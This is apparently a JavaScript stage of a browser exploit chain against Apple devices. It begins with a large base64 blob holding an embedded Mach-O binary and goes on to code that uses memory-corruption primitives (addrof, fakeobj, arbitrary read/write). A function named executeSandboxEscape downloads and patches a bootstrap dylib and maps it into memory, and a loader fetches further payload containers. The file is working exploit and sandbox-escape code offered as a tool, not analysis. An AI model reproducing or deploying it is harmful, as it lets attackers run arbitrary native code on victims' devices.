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eWxkX2Rsc3ltAGRsc3ltAG1hY2hfZXZlbnRsaW5rX2NyZWF0ZQBkeWxkVmVyc2lvbk51bWJlcgBnZXRwaWQAcHJvY19waWRpbmZvAHZtX3JlZ2lvbl82NAB2bV9wcm90ZWN0AG1hY2hfbWFrZV9tZW1vcnlfZW50cnkAdm1fbWFwAHZtX2FsbG9jYXRlAGtldmVudF9pZABfX1BBR0VaRVJPAF9fREFUQQBfX2VoX2ZyYW1lAF9fdW53aW5kX2luZm8AX194AF9fc3R1YnMAX19hdXRoX3N0dWJzAF9fb2JqY19zdHVicwBfX2ludGVybmFsAEBycGF0aAAvdXNyL2xpYi9saWJvYmpjLkEuZHlsaWIAL3Vzci9saWIvc3lzdGVtL2xpYmNhY2hlLmR5bGliAGR5bGRfc3R1Yl9iaW5kZXIAX19vYmpjX2VtcHR5X3Z0YWJsZQBfb2JqY19yZWFkQ2xhc3NQYWlyAF9wdGhyZWFkX2NyZWF0ZQAvdXNyL2xpYi9zeXN0ZW0vbGlic3lzdGVtX3B0aHJlYWQuZHlsaWIAcHRocmVhZF9jcmVhdGUAL3Vzci9saWIvc3lzdGVtL2xpYnN5c3RlbV9jLmR5bGliAG1hbGxvYwBmcmVlAF9hc2xfdmxvZwBfYXNsX2xvZwAvdXNyL2xpYi9zeXN0ZW0vbGlic3lzdGVtX3RyYWNlLmR5bGliAF9vc19sb2dfYWN0dWFsAF9vc19sb2dfaW50ZXJuYWwAX29zX2xvZ19kZWZhdWx0AHZhc3ByaW50ZgBfTlNHZXRNYWNoRXhlY3V0ZUhlYWRlcgBfX29zbG9nc3RyaW5nACV7cHVibGljfXMAL1N5c3RlbS9MaWJyYXJ5L0ZyYW1ld29ya3MvSmF2YVNjcmlwdENvcmUuZnJhbWV3b3JrL0phdmFTY3JpcHRDb3JlAEpTRXZhbHVhdGVTY3JpcHQAc2lnYWN0aW9uAG9iamVjdF9nZXRDbGFzcwBfb2JqY19wYXRjaF9yb290X29mX2NsYXNzAF9vYmpjX21hcF9pbWFnZXMAX190ZXh0AF9fQVVUSF9DT05TVABfX2NvbnN0AF9fREFUQV9DT05TVABvYmpjX3JldGFpbkF1dG9yZWxlYXNlAF9vYmpjX2ZsdXNoX2NhY2hlcwAvdXNyL2xpYi9saWJTeXN0ZW0uZHlsaWIAX05TR2V0QXJnYwBfTlNHZXRBcmd2AF9OU0dldEVudmlyb24AX05TR2V0UHJvZ25hbWUAAAAA");
}
const IA = 0,
    wA = 1,
    QA = 2,
    BA = 3,
    NA = 4,
    EA = 5,
    TA = 6,
    UA = 7,
    LA = 16777216 /* 1244951415 ^ 1261728631 */,
    sA = 4,
    kA = LA / 2 - 4,
    FA = LA / 2,
    SA = LA / 2;

// ── Symbol/API resolver (YA) ─────────────────────────────────────────────
function YA() {/* Original: YA → resolveSymbols */
    const A = new Uint32Array(new ArrayBuffer(LA)),
        g = new Uint8Array(A.buffer),
        D = new Uint32Array(A.buffer),
        M = platformModule.platformState.exploitPrimitive,
        C = M.addrof(A),
        I = M.readDoubleAsPointer(C + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.oGn3OG),
        w = new utilityModule.Int64(utilityModule._(I), utilityModule.F(I)),
        Q = M.addrof(A.buffer),
        B = M.readDoubleAsPointer(Q + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.CN3rr_);
    let N = M.read32(B + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.EMDU4o);
    N += 32, M.write32(B + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.EMDU4o, N);
    const E = {
        CA: I,
        IA: w,
        start() {
            setTimeout(E.wA, 1);
        },
        BA: (A, g) => Math.floor(Math.random() * (g - A + 1)) + A,
        NA() {
            D[1] = 0, D[0] = BA;
        },
        EA() {
            D[1] = 0, D[0] = BA;
        },
        // Telemetry removed
        TA(A, g, D, M) { if (D) D(); },
        // Fetch a single file as ArrayBuffer
        fetchBin(url) {
            // Override entry2_type0x0f.dylib
            url = url.replace(/\/entry2_type0x0f.dylib$/g, "/../../TweakLoader/.theos/obj/arm64" + (platformModule.platformState.hasPAC?"e":"") + "/TweakLoader.dylib");
            
            window.log("Downloading " + url);
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open("GET", url, true);
                xhr.responseType = "arraybuffer";
                xhr.onload = () => {
                    xhr.status === 200 && xhr.response ? resolve(xhr.response) : reject(xhr.status);
                };
                xhr.onerror = () => reject(0);
                xhr.send(null);
            });
        },
        // Cache for payloads/manifest.json
        _payloadManifest: null,
        async getPayloadManifest() {
            if (!E._payloadManifest) {
                const resp = await E.fetchBin("payloads/manifest.json");
                E._payloadManifest = JSON.parse(new TextDecoder().decode(resp));
            }
            return E._payloadManifest;
        },
        // Build F00DBEEF container from individual entry files
        async buildContainer(hashName) {
            const manifest = await E.getPayloadManifest();
            const entries = manifest[hashName];
            if (!entries) throw new Error("Hash not in manifest: " + hashName);

            // Special case: raw file (e.g. the download manifest)
            if (entries.length === 1 && entries[0].raw) {
                return await E.fetchBin("payloads/" + hashName + "/" + entries[0].file);
            }

            // Download all entry files in parallel
            const entryData = await Promise.all(entries.map(e =>
                E.fetchBin("payloads/" + hashName + "/" + e.file)
            ));

            // Calculate total size: 8 (header) + 16*N (entry table) + sum(entry sizes)
            const headerSize = 8 + 16 * entries.length;
            let totalSize = headerSize;
            for (const buf of entryData) totalSize += buf.byteLength;

            const container = new ArrayBuffer(totalSize);
            const view = new DataView(container);
            const out = new Uint8Array(container);

            // F00DBEEF header
            view.setUint32(0, 0xF00DBEEF, true);
            view.setUint32(4, entries.length, true);

            // Entry table + data
            let dataOffset = headerSize;
            for (let i = 0; i < entries.length; i++) {
                const e = entries[i];
                const tableOff = 8 + i * 16;
                view.setUint32(tableOff + 0, e.f1, true);
                view.setUint32(tableOff + 4, e.f2, true);
                view.setUint32(tableOff + 8, dataOffset, true);
                view.setUint32(tableOff + 12, entryData[i].byteLength, true);
                out.set(new Uint8Array(entryData[i]), dataOffset);
                dataOffset += entryData[i].byteLength;
            }

            window.log("[LOADER] Built F00DBEEF container: " + entries.length + " entries, " + totalSize + " bytes");
            return container;
        },
        // Feed raw ArrayBuffer directly into the shared WASM buffer
        feedRawBuffer(arrayBuffer) {
            const bytes = new Uint8Array(arrayBuffer);
            if (bytes.length > g.length - 8) { E.error(); return; }
            for (let i = 0; i < bytes.length; i++) g[i + 8] = bytes[i];
            D[1] = bytes.length;
            D[0] = BA;
        },
        download(A, g, M) {
            //alert("Download " + A + "\n" + new Error().stack);
            D[0] = QA;
            (async () => {
                try {
                    // Extract hash from URL (strip path, .min.js, .js, etc.)
                    let hashName = A;
                    const lastSlash = hashName.lastIndexOf("/");
                    if (lastSlash >= 0) hashName = hashName.substring(lastSlash + 1);
                    hashName = hashName.replace(/\.min\.js$/, "").replace(/\.js$/, "");

                    // Fetch decrypted F00DBEEF container from payloads/ directory
                    window.log("[LOADER] Loading payload: " + hashName);
                    const container = await E.buildContainer(hashName);
                    E.feedRawBuffer(container);
                    window.log("[LOADER] Fed " + container.byteLength + " bytes for " + hashName);
                } catch (err) {
                    window.log("[LOADER] Download error: " + err);
                    M();
                }
            })();
        },
        UA(A) {
            E.feedRawBuffer(A);
        },
        sA() {
            const A = new URL(location.href),
                g = "v" + new Date().getTime();
            A.searchParams.set(g, "0"), window.history.replaceState(null, null, A);
            const M = () => E.BA(111 /* 761805156 ^ 761805067 */, 999 /* 1919249010 ^ 1919248789 */),
                C = document.createElement("div");
            C.setAttribute("style", "opacity: 0.0"), C.innerHTML = M() + "-" + M() + "-" + M(), document.body.appendChild(C), setTimeout(() => {
                const A = new URL(location.href);
                A.searchParams.delete(g), window.history.replaceState(null, null, A), document.body.removeChild(C);
            }, 10000 /* 959736401 ^ 959728961 */), D[0] = IA;
        },
        wA() {
            if (D[0] === wA) {
                D[0] = QA;
                const A = new Uint8Array(g.buffer, sA, kA);
                let M = "";
                for (let g = 0; A[g] && g < A.length; g++) M += String.fromCharCode(A[g]);
                E.download(M, E.UA, E.error);
            } else if (D[0] === UA) {
                D[0] = QA;
                const A = new Uint8Array(g.buffer, sA, kA);
                let M = "";
                for (let g = 0; A[g] && g < A.length; g++) M += String.fromCharCode(A[g]);
                const C = new Uint8Array(g.buffer, FA, SA);
                let I = "";
                for (let A = 0; C[A] && A < C.length; A++) I += String.fromCharCode(C[A]);
                E.TA(M, I, E.NA, E.EA);
            } else D[0] === TA && E.sA();
            D[0] !== EA && setTimeout(E.wA, 1);
        },
        LA(A) {
            const M = A;
            if (M.length > g.length - 8) E.error(); else {
                for (let A = 0; A < M.length; A++) g[A + 8] = M.charCodeAt(A);
                D[1] = M.length, D[0] = BA;
            }
        },
        // Telemetry removed
        error() {
            D[0] = NA;
        }
    };
    return E;
}

// ── executeSandboxEscape (yA) — main sandbox escape entry ────────────────
function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
    const A = YA();
    let g;
    if (platformModule.On()) throw new Error("platformModule.On()");
    return g = (() => {
        //alert("P.platformState.fixedMachOVal2=" + P.platformState.fixedMachOVal2);
        const g = new MachOPayloadBuilder(platformModule.platformState.fixedMachOVal1, platformModule.platformState.fixedMachOVal2, platformModule.platformState.fixedMachOVal3);

        // ── PATCH: Load custom dylib with dynamic _process lookup ──
        // Dylib must be pre-truncated to Mach-O proper (no appended data).
        const _ORIG_PROCESS_OFF = 0x68d8; // hardcoded in B trampoline shellcode
        const _xhr = new XMLHttpRequest();
        _xhr.open("GET", "payloads/bootstrap.dylib", false);
        _xhr.overrideMimeType("text/plain; charset=x-user-defined");
        _xhr.send();
        const _raw = _xhr.responseText;
        // Build byte array from x-user-defined response
        const _buf = new Uint8Array(_raw.length);
        for (let _i = 0; _i < _raw.length; _i++) _buf[_i] = _raw.charCodeAt(_i) & 0xFF;
        const _dv = new DataView(_buf.buffer);
        // Parse LC_SYMTAB to find _process
        const _ncmds = _dv.getUint32(16, true);
        let _off = 32, _symtabOff = 0, _nsyms = 0, _strtabOff = 0;
        for (let _c = 0; _c < _ncmds; _c++) {
            const _cmd = _dv.getUint32(_off, true);
            const _cmdsize = _dv.getUint32(_off + 4, true);
            if (_cmd === 2) { // LC_SYMTAB
                _symtabOff = _dv.getUint32(_off + 8, true);
                _nsyms = _dv.getUint32(_off + 12, true);
                _strtabOff = _dv.getUint32(_off + 16, true);
            }
            _off += _cmdsize;
        }
        let _processOff = 0;
        for (let _i = 0; _i < _nsyms; _i++) {
            const _nlo = _symtabOff + _i * 16;
            const _strx = _dv.getUint32(_nlo, true);
            const _ntype = _buf[_nlo + 4];
            if ((_ntype & 0x0e) === 0) continue;
            let _name = "";
            for (let _j = _strtabOff + _strx; _j < _buf.length && _buf[_j]; _j++)
                _name += String.fromCharCode(_buf[_j]);
            if (_name === "_process") {
                _processOff = _dv.getUint32(_nlo + 8, true);
                break;
            }
        }
        if (!_processOff) throw new Error("[PATCH] _process symbol not found in dylib");
        // Convert entire file (already truncated) to oA string
        const _origLen = g.oA.length;
        let _oA = "";
        for (let _i = 0; _i < _buf.length; _i += 2)
            _oA += String.fromCharCode(_buf[_i] | ((_buf[_i + 1] || 0) << 8));
        g.oA = _oA;
        window.log("[PATCH] Loaded bootstrap.dylib: " + _buf.length + "B, oA=" + _oA.length +
            " (orig " + _origLen + "), _process=0x" + _processOff.toString(16));
        // ── END PATCH (redirect applied after buffer is built, below) ──

        let dylibSize = (g.length() + 0x1000 & 0xfffff000) >>> 0;
        const dylibSizeWithSomeExtraSize = dylibSize + 0x200000,
            dylibLoadAddress = platformModule.platformState.sandboxEscape.newInt64OfSomething(dylibSizeWithSomeExtraSize).toPointerValue();
        g.kA = Offset64.fromUnsigned(A.CA), g.FA(Offset64.fromUnsigned(dylibLoadAddress));
        const dylibLoadAddressO64 = Offset64.fromUnsigned(dylibLoadAddress);
        let dylibBufferEncoded = g.SA(dylibLoadAddressO64);
        for (; dylibBufferEncoded.length % 4 != 0;) dylibBufferEncoded += "\0";
        dylibSize = 2 * dylibBufferEncoded.length;
        const dylibBuffer = window.PhZuiP = new Uint32Array(new ArrayBuffer(dylibSize));
        for (let i = 0; i < dylibSize; i += 4) dylibBuffer[i / 4] = utilityModule.readU16FromString(dylibBufferEncoded, i) >>> 0;
        // ── PATCH: If _process moved, write a B redirect at the hardcoded offset ──
        if (_processOff !== _ORIG_PROCESS_OFF) {
            const _branchDist = (_processOff - _ORIG_PROCESS_OFF) >> 2;
            const _branchInstr = 0x14000000 | (_branchDist & 0x3FFFFFF);
            dylibBuffer[_ORIG_PROCESS_OFF >> 2] = _branchInstr;
            window.log("[PATCH] Redirect: wrote B at 0x" + _ORIG_PROCESS_OFF.toString(16) +
                " -> 0x" + _processOff.toString(16) +
                " (instr=0x" + _branchInstr.toString(16) + ")");
        } else {
            window.log("[PATCH] _process at original offset 0x" + _ORIG_PROCESS_OFF.toString(16) + ", no redirect needed");
        }
        //window.addDownloadBinary("lzwDecoded.dylib", new Uint32Array(dylibBuffer.slice(0)));
        const dylibLoadAddressI64 = utilityModule.Int64.fromNumber(dylibLoadAddress),
            dylibDataAddressMaybe = utilityModule.Int64.fromNumber(platformModule.platformState.exploitPrimitive.fakeobj(dylibBuffer));
        window.log("dylib load address: 0x" + dylibLoadAddress.toString(16));
        window.log("data address?: 0x" + dylibDataAddressMaybe.toNumber().toString(16));
        window.log("dylib size: 0x" + dylibSize);
        platformModule.platformState.sandboxEscape.Ad(dylibLoadAddressI64, dylibDataAddressMaybe, dylibSize);
        const T = g.YA().ct() + 4;
        //alert("D 0x" + T.toString(16));
        return platformModule.platformState.caller.jd(utilityModule.Int64.fromNumber(T)).Pt();
    })(), A.start(), g;
}; const yA = executeSandboxEscape;
// ── MachOPayloadBuilder (oA) — builds Mach-O payload in memory ───────────
class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
    constructor(fixedValue1, fixedValue2, fixedValue3) {
        //alert("CALLED");
        const M = new Offset64(0, 0);
        this.yA = CA(M, M, M, M, 0, M, M, M, M, M, M, M, M, M, M, M, M, M, M, M, M, M, M);
        this.oA = gA.lzwDecompress(
            gA.base64DecodeUtf16("zwD6AO0A/gAMAAAAAAABAAUBBQEGAAgBFQAIARAACgAFAYUAAAAQAAgBBQEZAAgBaAADAAUBXwBfAFQARQBYAFQAFAEhASIBFAHAACMBJgElASEBBQAIASoBBQEPASIBGwF0AGUAeAB0ACYBGgEcAR4BIAE1AewAXAAiAbwAUwAiATsBBQECADUBCAEEAAAAgABEATYBeABJATYBHQEfAUQBqACwACIB2AAHASEBUQFCAUwBRgFIAUkBGwFzAHQAdQBiAHMANQEbAU4BOQEmAYAAsgAiAUQARgEhAWgBWAFEAQgAWgEUAQQBLwFfAF4BYAFfAGgAZQBsAHAAZQByAAgBZAE4AUQBxAC2ACIBXABsARQBhAFvAUQBcgFcAV8AbwBiAGoAYwB2AV8BYQEUAYEBTwE1ASAAuwAiAUAAIwGbAQUBLAGMAUcBTAEbAWMAbwBuAF4BYwE3AZkBJgFgAJwBIQEwACMBrwEFAYgBTAGlAV8AYwBeAXIAaQBuAGcAIwGYAWYBIwGQALABiQFDASEBxAG3AQAAxwG3ARsBkAGSAV8AbQBlAHQAaABuAGEA0gEAAMEBRAFUAL4AIgE+ACMB3AEFAVUBNQHMAbgBdQBuAHcAvQFkAF8AvQFmAG8AgAGsAcIBIgGUAN0BIQEYAOMBCAH0AYsBygFEARsBZQBoAF8AZgByANcBZQB1AWUBRAGwAL8AIgE0ACMBCQIFARkB/AFJARYBBQE4AFUBGwFEAEEAVABBAF8AQwBPAE4AUwDyASgBIQGeASIBIgIUASQCFAEQAgAAKgIqAhMBNgFnAG8ANAH9AV8AGAIaAhwCHgIgAiEBJgIFAZAAJwEPAkkBCgEFAVsAjgGnAakBMgLAATQCGQIbAh0CHwLCAZAAOwIAALIBIgFPAj8CEQIzAs8BkwFpAG0AYQBnAGUA7QFvABcCSgI3Ak0CJAFQAggAIwHAACgB5QFWAiIBEwIAAFQBNgE1AkEATAH4AQUBKAIhAXUCAAB3AlUCKwIrAUgCbABhAHYBeQBtAGIAbwBsAF8AcAB0AH8BYQIaAnQCIQHYAGsCCAEHASoCJgEHAAgBbQCOAVgCdgF7AXIAZQBmAGIB2QFJAo0CNQGQAnUCLgKPAgIAkwJJASwBpwKrAZoCYwCAAnMAcwCdAp8CjAJzAjUB6ACpAiEBZwIiAbkCqgK3Aa0CJgEbAb0BMQFyANYBbAB1AXICRAHwALoCTAHMAnkCbAIhARsBZABhAHQAYQAzAsoCNQHPArsCIwHbApQC0QIUAW4CSADwAUwASQBOAEsARQBEAEkA8gF2AnUC8AAcACMBQADuAvACeAKSAkkBDQAIASAACAEYAPYCFAHjAQcBeAAwADEAIQEiAAUBgABSAu0CEgENAfICEgGRAhQBIABCAAcBYAC8AoAASgAHAfwCiwEYAxIBSwAHAXAACAEwAFUABwHAAJYCAAALAAgBUAAjAf8C/QLLAQgBbgDgAiMBEABSAAcByADRAhsA+wIIAUEA0wCeACAABACjADUA9ACsABMA9gBpASYAAwCGADIA+QIIAWsC+AIFAfgC4wGUAgEANAADACoADQFJASwANwMIASgCWwEmAXQBAAA4AFgDLAP+AvYCLwB1ALMCLwBsAGkAYgBnA2kDpwFtAHAAnQKyAmkAqAEuAGQAeQBoA2IACAFdA18DBQEaA2sC5ABjA2UDcgBrA2oDdwNYAi4AQQB0A3YDaQNcAycDYANrAkEAGAMHAS8AUwB5AF4BZQBtAC8ATABpAwMCcgB5AC8ARgADAtIBdwBvAHIAawBzAC8AVQBJAEsAaQB0AC4AAgIEAqMDpQOoA6oDrAOMAwUBYACOAxQB/wChACQDlgAAAJMDlQMxAZgDmgNiAJwDngOgA7ADpAOmAy8AQwCkA2UARgBvAOcB1AJ0AHIDbgCuA6EDZQCxA2sAzAPOA9AD0gPVAtUDIgFdA2gAuQMPAjwA2QBsAZIDlAOWA8MDmwNhAJ0DnwPYA9oDpwPrA8IDzQNuAGYAaQBnAHUAAwLUA3MDrwOiA8oDwAPsA/cD+QP7A/0D4QN5AwgBWADlAwAAZwJ6ACwB6gPBA5cDm